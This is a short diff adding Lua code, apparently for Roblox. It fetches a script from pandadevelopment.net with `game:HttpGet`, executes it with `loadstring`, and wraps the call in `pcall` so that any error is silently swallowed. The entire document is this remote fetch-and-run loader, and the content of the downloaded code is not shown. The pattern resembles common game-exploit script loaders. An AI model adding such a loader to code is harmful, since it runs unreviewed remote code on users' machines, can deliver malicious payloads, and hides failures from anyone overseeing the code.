@@ -1,0 +1,3 @@
+pcall(function()
+     loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/5b91b396b1af1262"))()
+ end)
